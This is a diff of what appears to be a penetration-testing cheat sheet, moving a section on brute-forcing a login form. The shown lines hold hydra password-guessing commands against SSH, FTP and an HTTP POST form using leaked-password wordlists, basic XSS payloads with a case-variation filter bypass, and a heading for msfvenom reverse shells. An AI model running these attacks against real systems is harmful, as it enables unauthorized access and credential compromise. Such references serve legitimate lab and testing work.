@@ -59,17 +59,18 @@ hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh\
 hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
 *You can use same for FTP, just replace ssh with ftp*
 
+**HTTP POST Form**\
+hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L /usr/share/ncrack/minimal.usr -P /root/Tools/SecLists/Passwords/Leaked-Databases/rockyou-15.txt -f -V
+
+*You will know which wordlists to use when the time comes*
+
+
 ### XSS
 <script>alert(1)</script>\
 <ScRiPt>alert(1)</ScRiPt>
 
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
-
-**HTTP POST Form**\
-hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L /usr/share/ncrack/minimal.usr -P /root/Tools/SecLists/Passwords/Leaked-Databases/rockyou-15.txt -f -V
-
-*You will know which wordlists to use when the time comes*
 
 ### msfvenom shells
 **JSP Java Meterpreter Reverse TCP**\
